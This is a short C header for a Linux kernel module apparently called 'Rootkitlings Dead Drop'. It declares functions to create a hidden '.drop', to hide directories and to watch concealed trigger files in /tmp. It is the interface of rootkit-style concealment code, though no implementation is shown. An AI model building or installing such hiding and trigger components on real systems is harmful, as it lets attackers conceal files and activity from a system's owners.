/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_DEAD_DROP_H
#define ROOTKITLINGS_DEAD_DROP_H
#include <linux/types.h>
#define DROP_NAME   ".drop"
#define UNLOCK_PATH "/tmp/.rk-unlock"
#define LOCK_PATH   "/tmp/.rk-lock"
int drop_create(void);
void drop_destroy(void);
void drop_set_unlocked(bool unlocked);
bool drop_is_unlocked(void);
int dirhide_start(void);
void dirhide_stop(void);
int trigger_start(void);
void trigger_stop(void);
#endif
